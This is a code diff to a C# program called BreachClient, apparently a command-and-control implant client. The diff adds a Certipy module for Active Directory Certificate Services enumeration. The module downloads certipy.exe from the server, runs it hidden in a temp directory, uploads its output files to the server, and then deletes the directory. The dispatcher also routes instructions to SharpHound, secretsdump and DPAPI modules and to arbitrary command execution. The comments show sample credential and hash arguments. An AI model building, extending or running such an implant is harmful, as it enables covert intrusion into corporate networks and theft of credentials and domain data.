@@ -65,6 +65,7 @@ namespace BreachClient
                 {
                     "recon"       => await RunRecon(instruction),
                     "sharphound"  => await RunSharpHound(instruction),
+                    "certipy"     => await RunCertipy(instruction),
                     "secretsdump" => await RunDownloadAndExec(instruction),
                     "dpapi"       => await RunDownloadAndExec(instruction),
                     _             => ExecuteCommand(instruction)
@@ -194,6 +195,65 @@ namespace BreachClient
                     : stdout + "\n[stderr] " + stderr;
 
                 return result.Trim() + $"\n[+] Uploaded {zips.Length} ZIP file(s) to server";
+            }
+            finally
+            {
+                try { Directory.Delete(workDir, recursive: true); } catch { }
+            }
+        }
+
+        // ── Certipy module (ADCS enumeration) ────────────────────────────────
+
+        /// <summary>
+        /// Download certipy.exe from the server, run it in a temp working directory,
+        /// upload any output files it produces (.json, .txt, .zip), then return stdout.
+        ///
+        /// Instruction: certipy subcommand + args
+        ///   e.g. "find -u administrator@corp.local -p Password123 -dc-ip 10.0.0.1"
+        ///        "find -u administrator@corp.local -hashes :aad3b435b51404eeaad3b435b51404ee:... -dc-ip 10.0.0.1"
+        /// </summary>
+        static async Task<string> RunCertipy(string args)
+        {
+            string? toolPath = await DownloadTool("certipy.exe");
+            if (toolPath == null)
+                return "[error] Failed to download certipy.exe from server";
+
+            string workDir = Path.Combine(Path.GetTempPath(), "cp_" + Guid.NewGuid().ToString("N")[..8]);
+            Directory.CreateDirectory(workDir);
+
+            string cpPath = Path.Combine(workDir, "certipy.exe");
+            File.Copy(toolPath, cpPath, overwrite: true);
+
+            try
+            {
+                var psi = new ProcessStartInfo
+                {
+                    FileName               = cpPath,
+                    Arguments              = args,
+                    WorkingDirectory       = workDir,
+                    RedirectStandardOutput = true,
+                    RedirectStandardError  = true,
+                    UseShellExecute        = false,
+                    CreateNoWindow         = true
+                };
+
+                using var proc = Process.Start(psi)!;
+                string stdout = proc.StandardOutput.ReadToEnd();
+                string stderr = proc.StandardError.ReadToEnd();
+                proc.WaitForExit();
+
+                // Upload all output files certipy produced (.json, .txt, .zip)
+                var outputFiles = Directory.GetFiles(workDir)
+                    .Where(f => !f.EndsWith("certipy.exe", StringComparison.OrdinalIgnoreCase))
+                    .ToArray();
+                foreach (var f in outputFiles)
+                    await UploadFile(f);
+
+                string result = string.IsNullOrWhiteSpace(stderr)
+                    ? stdout
+                    : stdout + "\n[stderr] " + stderr;
+
+                return result.Trim() + $"\n[+] Uploaded {outputFiles.Length} output file(s) to server";
             }
             finally
             {
